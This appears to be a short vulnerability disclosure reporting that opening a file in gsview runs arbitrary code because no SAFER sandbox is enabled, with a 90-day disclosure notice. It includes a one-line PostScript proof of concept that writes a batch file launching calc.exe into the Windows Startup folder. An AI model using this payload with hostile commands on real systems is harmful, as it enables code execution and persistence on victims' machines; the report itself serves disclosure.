That means opening a file in gsview is equivalent to running arbitrary code, the obvious attack is doing something like:

(C:/Users/foo/Start Menu/Startup/exploit.bat) (w) file dup (calc.exe) writestring closefile

I don&#039;t think it&#039;s clear from the documentation that you cannot open untrusted files, and I can&#039;t find any configuration setting to enable the SAFER sandbox.

This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available (whichever is earlier), the bug
report will become visible to the public.
